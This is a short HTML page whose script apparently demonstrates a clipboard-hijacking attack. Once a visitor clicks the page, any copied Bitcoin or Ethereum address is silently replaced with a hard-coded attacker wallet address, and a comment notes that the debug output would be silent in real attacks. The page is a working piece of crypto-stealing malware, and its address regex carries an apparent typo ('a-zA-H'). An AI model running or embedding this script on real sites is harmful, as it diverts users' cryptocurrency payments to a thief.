<!DOCTYPE html>
<html>
<body>
  <h1>Click this page first, then copy a crypto address.</h1>
  <script>
    // Require a click to bypass browser security
    document.body.onclick = () => {
      document.addEventListener("copy", (e) => {
        const text = window.getSelection().toString();
        // Regex for BTC/ETH addresses
        if (text.match(/^(bc1|[13]|0x)[a-zA-H0-9]{25,42}$/)) {
          e.clipboardData.setData("text/plain", "0x9701b5f824873560ad5670De0891D8D80F998eBa"); // Swap address
          e.preventDefault();
          console.log("[DEBUG] Address swapped!"); // Silent in real attacks
        }
      });
    };
  </script>
</body>
</html>
